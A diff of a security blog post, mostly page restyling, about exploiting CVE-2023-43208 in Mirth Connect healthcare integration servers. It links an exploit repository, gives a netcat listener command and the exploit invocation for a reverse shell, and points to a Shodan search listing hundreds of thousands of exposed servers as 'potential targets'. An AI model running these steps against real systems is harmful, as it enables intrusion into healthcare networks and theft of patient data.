@@ -1,12 +1,239 @@
 <!DOCTYPE html>
-<html>
-	<head>
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<meta charset="utf-8" />
-		<link rel="stylesheet" type="text/css" href="css/style.css" />
-		<title>Mirth Connect RCE: When Healthcare Data Meets Insecure Defaults.</title>
-	</head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mirth Connect RCE: When Healthcare Data Meets Insecure Defaults - gotr00t Security Research</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(45deg, #000000, #0a0a0a, #111111);
+            color: #ffffff;
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        /* Animated binary background */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.15) 1px, transparent 0);
+            background-size: 20px 20px;
+            animation: binaryFlow 10s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes binaryFlow {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(20px); }
+        }
+
+        /* Navigation */
+        .nav-header {
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid #ffffff;
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 20px rgba(255, 255, 255, 0.3);
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-link {
+            color: #ffffff;
+            text-decoration: none;
+            padding: 12px 20px;
+            border: 1px solid transparent;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #ffffff;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .nav-link.active {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ffffff;
+            color: #ffffff;
+        }
+
+        .nav-link i {
+            color: #ffffff;
+            width: 16px;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            min-height: 100vh;
+        }
+
+        .terminal-prompt {
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3em;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ffffff;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            letter-spacing: 3px;
+        }
+
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2em;
+            font-weight: 700;
+            margin: 30px 0 15px 0;
+            color: #ffffff;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            letter-spacing: 2px;
+        }
+
+        h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5em;
+            font-weight: 400;
+            margin: 25px 0 10px 0;
+            color: #ffffff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            letter-spacing: 1px;
+        }
+
+        p {
+            margin-bottom: 15px;
+            font-size: 1.1em;
+            color: #ffffff;
+        }
+
+        strong {
+            color: #ffffff;
+            font-weight: bold;
+        }
+
+        a {
+            color: #00ff00;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #ffffff;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        figure {
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        figure img {
+            max-width: 100%;
+            height: auto;
+            border: 2px solid #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        figure img:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .nav-links {
+                gap: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .nav-link {
+                padding: 10px 15px;
+                font-size: 0.9em;
+            }
+            
+            h1 {
+                font-size: 2.5em;
+            }
+            
+            h2 {
+                font-size: 1.8em;
+            }
+            
+            .container {
+                padding: 20px 15px;
+            }
+        }
+    </style>
+</head>
 <body>
+    <!-- Navigation -->
+    <nav class="nav-header">
+        <div class="nav-container">
+            <ul class="nav-links">
+                <li><a href="../index.html" class="nav-link"><i class="fas fa-home"></i>Home</a></li>
+                <li><a href="../poc.html" class="nav-link"><i class="fas fa-bug"></i>PoC</a></li>
+                <li><a href="../projects.html" class="nav-link"><i class="fas fa-code"></i>Projects</a></li>
+                <li><a href="../guides.html" class="nav-link"><i class="fas fa-book"></i>Guides</a></li>
+                <li><a href="../blog.html" class="nav-link active"><i class="fas fa-pen-nib"></i>Blog</a></li>
+                <li><a href="../contact.html" class="nav-link"><i class="fas fa-envelope"></i>Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="terminal-prompt">gotr00t@mirth:~$</div>
 <h1>Mirth Connect RCE: When Healthcare Data Meets Insecure Defaults.</h1>
 
 <h2>From version detection to reverse shell: exploiting critical vulnerabilities in Mirth Connect.</h2>
@@ -35,7 +262,7 @@
 
 <p>You can download it here: <a href="https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit">https://github.com/gotr00t0day/NextGen-Mirth Connect-Exploit</a></p>
 
-<figure><img src="Images/mirth_poc.png"/></figure>
+<figure><img src="../Images/mirth_poc.png"/></figure>
 
 <p>As you can see in the picture above, I found a few Mirth Connect servers that might be vulnerable to CVE-2023-43208.</p>
 
@@ -43,23 +270,25 @@
 
 <p>If you use the exploit, for a reverse shell, make sure you use the proper flags and arguments.</p>
 
-<p><strong>Start a nectar listener</strong>: nc -lvp 1337</p>
+<p><strong>Start a netcat listener</strong>: nc -lvp 1337</p>
 
 <p><strong>Run the PoC</strong>: </p>
 
-<p>python3 mirthconnect<em>exploit.py -t IP-p PORT -lh localhost -lp 1337 --exploit</em></p>
+<p>python3 mirthconnect_exploit.py -t IP -p PORT -lh localhost -lp 1337 --exploit</p>
 
 <p>If you’re lucky, you should see a connection back on your netcat listener.</p>
 
 <h2>Finding vulnerable servers in shodan</h2>
 
-<figure><img src="Images/mirth_shodan.png"/></figure>
+<figure><img src="../Images/mirth_shodan.png"/></figure>
 
 <p>As you can see in the image above, there are 272,724 potential targets, a lot of these are running vulnerable versions.</p>
 
 <h3>This blog was created to expose critical vulnerabilities and demonstrate the dangers when system administrators fail to properly patch their applications, highlighting the significant risks this poses. This research is conducted for educational and awareness purposes.</h3>
 
 <h1>HAPPY HACKING</h1>
+
+    </div>
 
 </body>
 </html>
